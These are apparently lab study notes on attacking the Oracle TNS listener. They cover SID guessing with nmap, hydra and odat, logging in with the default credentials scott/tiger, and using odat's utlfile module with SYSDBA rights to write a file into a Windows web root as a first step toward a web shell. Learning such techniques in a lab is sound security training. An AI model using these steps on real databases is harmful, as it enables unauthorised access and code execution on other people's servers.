The `Oracle Transparent Network Substrate` (`TNS`) server is a communication protocol that facilitates communication between Oracle databases and applications over networks. Initially introduced as part of the [Oracle Net Services](https://docs.oracle.com/en/database/oracle/oracle-database/18/netag/introducing-oracle-net-services.html) software suite, TNS supports various networking protocols between Oracle databases and client applications, such as `IPX/SPX` and `TCP/IP` protocol stacks. As a result, it has become a preferred solution for managing large, complex databases in the healthcare, finance, and retail industries. In addition, its built-in encryption mechanism ensures the security of data transmitted, making it an ideal solution for enterprise environments where data security is paramount.

### Default Configuration :
-  By default, the listener listens for incoming connections on the `TCP/1521` port. However, this default port can be changed during installation or later in the configuration file. The TNS listener is configured to support various network protocols, including `TCP/IP`, `UDP`, `IPX/SPX`, and `AppleTalk`. The listener can also support multiple network interfaces and listen on specific IP addresses or all available network interfaces. By default, Oracle TNS can be remotely managed in `Oracle 8i`/`9i` but not in Oracle 10g/11g.

#### Tnsnames.ora :
```txt
ORCL =
  (DESCRIPTION =
    (ADDRESS_LIST =
      (ADDRESS = (PROTOCOL = TCP)(HOST = 10.129.11.102)(PORT = 1521))
    )
    (CONNECT_DATA =
      (SERVER = DEDICATED)
      (SERVICE_NAME = orcl)
    )
  )
```

> On the other hand, the `listener.ora` file is a server-side configuration file that defines the listener process's properties and parameters, which is responsible for receiving incoming client requests and forwarding them to the appropriate Oracle database instance.

- There are various ways to enumerate, or better said, guess SIDs. Therefore we can use tools like `nmap`, `hydra`, `odat`, and others. Let us use `nmap` first.

- In this example, we found valid credentials for the user `scott` and his password `tiger`. After that, we can use the tool `sqlplus` to connect to the Oracle database and interact with it.

- Another option is to upload a web shell to the target. However, this requires the server to run a web server, and we need to know the exact location of the root directory for the webserver. Nevertheless, if we know what type of system we are dealing with, we can try the default paths, which are:

|**OS**|**Path**|
|---|---|
|Linux|`/var/www/html`|
|Windows|`C:\inetpub\wwwroot`|

#### Oracle RDBMS - File Upload :
```shell
Pwn1Sec@htb[/htb]$ echo "Oracle File Upload Test" > testing.txt
Pwn1Sec@htb[/htb]$ ./odat.py utlfile -s 10.129.204.235 -d XE -U scott -P tiger --sysdba --putFile C:\\inetpub\\wwwroot testing.txt ./testing.txt

[1] (10.129.204.235:1521): Put the ./testing.txt local file in the C:\inetpub\wwwroot folder like testing.txt on the 10.129.204.235 server                                                                                                  
[+] The ./testing.txt file was created on the C:\inetpub\wwwroot directory on the 10.129.204.235 server like the testing.txt file
```

- Finally, we can test if the file upload approach worked with `curl`. Therefore, we will use a `GET http://<IP>` request, or we can visit via browser.

```shell
Pwn1Sec@htb[/htb]$ curl -X GET http://10.129.204.235/testing.txt

Oracle File Upload Test
```
